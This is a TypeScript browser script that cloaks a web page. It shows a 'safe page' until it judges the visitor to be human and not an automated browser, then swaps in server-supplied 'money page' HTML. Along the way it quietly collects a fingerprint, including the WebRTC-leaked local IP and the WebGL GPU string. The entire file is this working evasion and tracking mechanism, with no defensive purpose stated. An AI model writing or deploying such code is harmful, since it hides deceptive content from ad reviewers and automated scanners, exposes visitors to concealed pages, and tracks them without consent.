/**
 * Mounts behavioral listeners and unlocks the money page via POST /track/verify.
 */
export function mountSafePageHydrator() {
  const scoreThreshold = 15;
  let score = 0;
  const events: { t: string; ts: number }[] = [];

  const campaignIdFromQuery = (): string => {
    const q = window.location.search;
    if (!q || q.length < 2) {
      return '';
    }
    return new URLSearchParams(q.slice(1)).get('campaign_id') ?? '';
  };

  const trackActivity = (e: Event) => {
    score += 1;
    events.push({ t: e.type, ts: Date.now() });
    if (score >= scoreThreshold) {
      cleanup();
      void unlockMoneyPage();
    }
  };

  const cleanup = () => {
    window.removeEventListener('mousemove', trackActivity);
    window.removeEventListener('touchstart', trackActivity);
    window.removeEventListener('scroll', trackActivity);
  };

  const isBot = (): boolean => {
    return navigator.webdriver || !navigator.languages || navigator.languages.length === 0;
  };

  const isMobile = (): boolean => {
    return /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
  };

  const collectWebRTCLocalIP = (): Promise<string> => {
    return new Promise((resolve) => {
      const rtc = new RTCPeerConnection({ iceServers: [] });
      let settled = false;
      const finish = (ip: string) => {
        if (settled) {
          return;
        }
        settled = true;
        rtc.close();
        resolve(ip);
      };
      rtc.createDataChannel('');
      rtc.onicecandidate = (ice) => {
        if (!ice || !ice.candidate) {
          finish('');
          return;
        }
        const m = /([0-9]{1,3}(?:\.[0-9]{1,3}){3}|[a-f0-9:]+)/i.exec(ice.candidate.candidate);
        finish(m?.[1] ?? '');
      };
      void rtc.createOffer().then((offer) => rtc.setLocalDescription(offer));
      window.setTimeout(() => finish(''), 800);
    });
  };

  const collectWebGLRenderer = (): string => {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') ?? canvas.getContext('experimental-webgl');
      if (!gl) {
        return '';
      }
      const ext = gl.getExtension('WEBGL_debug_renderer_info');
      if (!ext) {
        return '';
      }
      return String(gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) ?? '');
    } catch {
      return '';
    }
  };

  const fingerprint = async () => ({
    ua: navigator.userAgent,
    lang: navigator.language,
    languages: [...navigator.languages],
    platform: navigator.platform,
    cores: navigator.hardwareConcurrency ?? 0,
    screen: [window.screen.width, window.screen.height, window.screen.colorDepth],
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    webdriver: Boolean(navigator.webdriver),
    webrtc_local_ip: await collectWebRTCLocalIP(),
    webgl_renderer: collectWebGLRenderer(),
    mobile: isMobile(),
  });

  const unlockMoneyPage = async () => {
    if (isBot()) {
      return;
    }
    const campaignId = campaignIdFromQuery();
    if (!campaignId) {
      return;
    }
    const res = await fetch('/track/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        campaign_id: campaignId,
        events,
        fingerprint: await fingerprint(),
      }),
    });
    if (!res.ok) {
      return;
    }
    const data = await res.json();
    if (!data?.success || !data.html_content) {
      return;
    }
    document.open();
    document.write(data.html_content);
    document.close();
  };

  window.addEventListener('mousemove', trackActivity);
  window.addEventListener('touchstart', trackActivity);
  window.addEventListener('scroll', trackActivity);
}
